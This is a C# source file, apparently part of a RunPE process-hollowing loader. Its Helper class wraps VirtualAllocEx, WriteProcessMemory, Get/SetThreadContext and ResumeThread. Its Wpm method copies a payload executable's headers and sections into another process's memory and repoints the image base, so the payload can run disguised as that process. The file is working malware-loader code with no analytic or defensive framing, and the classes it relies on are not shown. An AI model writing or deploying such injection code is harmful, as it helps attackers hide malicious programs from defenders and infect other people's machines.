using System;
using Runpe;

namespace RunPE
{
    public class Helper : Api
    {
        //Use : Class1.
        public static void Rt()
        {
            ResumeThread(Class1.pi.hThread);
        }

        public static void Stc(int[] context)
        {
            SetThreadContext(Class1.pi.hThread, context);
        }

        public static void Wpm(int newImageBase, byte[] payload, int sizeOfHeader, int lireEcrire, int fileAdress,
            int ebx, int bufferSize)
        {
            WriteProcessMemory(Class1.pi.hProcess, newImageBase, payload, sizeOfHeader, ref lireEcrire);
            int sectionOffset = fileAdress + 248;
            short numberOfSection = BitConverter.ToInt16(payload, fileAdress + 6);
            for (int s = 0; s < numberOfSection; s++)
            {
                int virtualAdress = BitConverter.ToInt32(payload, sectionOffset + 12);
                int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 16);
                int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 20);
                if (sizeOfRawData != 0)
                {
                    byte[] sectionData = new byte[sizeOfRawData];
                    Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0, sectionData.Length);
                    WriteProcessMemory(Class1.pi.hProcess, newImageBase + virtualAdress, sectionData,
                        sectionData.Length,
                        ref lireEcrire);
                }

                sectionOffset += 40;
            }

            byte[] pointerData = BitConverter.GetBytes(newImageBase);
            WriteProcessMemory(Class1.pi.hProcess, ebx, pointerData, bufferSize, ref lireEcrire);
        }

        public static int Vae(int imageBase, int sizeOfImage, int type, int protect)
        {
            return VirtualAllocEx(Class1.pi.hProcess, imageBase, sizeOfImage, type, protect);
        }

        public static void Rpm(int ebx, int baseAdress, int bufferSize, int lireEcrire)
        {
            ReadProcessMemory(Class1.pi.hProcess, ebx, ref baseAdress, bufferSize, ref lireEcrire);
        }

        public static void Gtc(int[] context)
        {
            GetThreadContext(Class1.pi.hThread, context);
        }
    }
}